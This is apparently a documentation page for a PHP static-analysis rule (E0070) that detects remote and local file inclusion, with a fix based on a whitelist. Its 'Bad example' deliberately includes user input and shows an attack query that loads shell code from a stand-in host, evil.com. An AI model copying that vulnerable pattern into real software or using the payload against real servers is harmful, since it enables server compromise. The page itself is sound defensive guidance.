E0070 security critical

Remote file inclusion

Using user-controlled input to determine which file to include or require can allow an attacker to load and execute remote or local files on the server.

Using user-controlled input to determine which file to include or require can allow an attacker to load and execute remote or local files on the server.

Why it matters

Remote file inclusion (RFI) and local file inclusion (LFI) can allow attackers to:

  • Include and execute PHP code from remote servers
  • Read sensitive local files
  • Compromise the server

Bad example

$page = $_GET['page'] ?? '';
include $page; // ?page=http://evil.com/shell.txt

An attacker can host a malicious PHP file on their server and cause your application to include it.

Good example

$page = $_GET['page'] ?? '';
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include __DIR__ . "/pages/$page.php";

What it checks

  • include, require, include_once, and require_once where the path is built from user-controlled input
  • file_get_contents(), readfile(), and fopen() with user-controlled file paths from remote sources

When it does not report

  • Cases where the page or file name is validated against a whitelist before inclusion
  • Static file paths with no user input

How to fix

  1. Do not include files based directly on user input.
  2. Use a whitelist of allowed files or pages.
  3. Use absolute paths within your application directory.
  4. Set allow_url_fopen = Off in php.ini where appropriate.

Configuration

E0070 is enabled by default and has no configuration options.
